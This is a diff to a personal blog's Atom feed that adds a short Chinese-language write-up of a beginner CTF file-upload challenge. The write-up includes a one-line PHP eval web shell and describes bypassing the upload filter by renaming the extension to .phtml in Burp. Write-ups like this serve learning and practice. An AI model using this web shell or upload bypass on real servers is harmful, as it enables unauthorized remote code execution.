@@ -6,7 +6,7 @@
   <link href="http://vinsonx.net/atom.xml" rel="self"/>
   
   <link href="http://vinsonx.net/"/>
-  <updated>2022-03-25T08:34:30.379Z</updated>
+  <updated>2022-03-26T01:43:32.951Z</updated>
   <id>http://vinsonx.net/</id>
   
   <author>
@@ -15,6 +15,25 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ACTF2020新生赛Upload</title>
+    <link href="http://vinsonx.net/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/"/>
+    <id>http://vinsonx.net/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/</id>
+    <published>2022-03-26T01:23:13.000Z</published>
+    <updated>2022-03-26T01:43:32.951Z</updated>
+    
+    <content type="html"><![CDATA[<p>发一些入门的CTF题目（Upload）<span id="more"></span><br>首先打开题目靶场是一个上传文件<br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/%E9%A2%98%E7%9B%AE.png" alt="题目"><br>尝试上传一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提示报错<br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/%E6%8F%90%E7%A4%BA.png" alt="提示"><br>我们利用bp抓包，更改后缀名为phtml<br>上传绕过不懂的可以看这个链接<br>转载<a href="https://blog.csdn.net/qq_38680693/article/details/81700378">https://blog.csdn.net/qq_38680693/article/details/81700378</a><br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/bp.png" alt="bp"><br>访问网址利用hackbar工具查看flag<br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/flag.png" alt="flag"></p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;发一些入门的CTF题目（Upload）&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="CTF" scheme="http://vinsonx.net/categories/CTF/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>2022/3随笔</title>
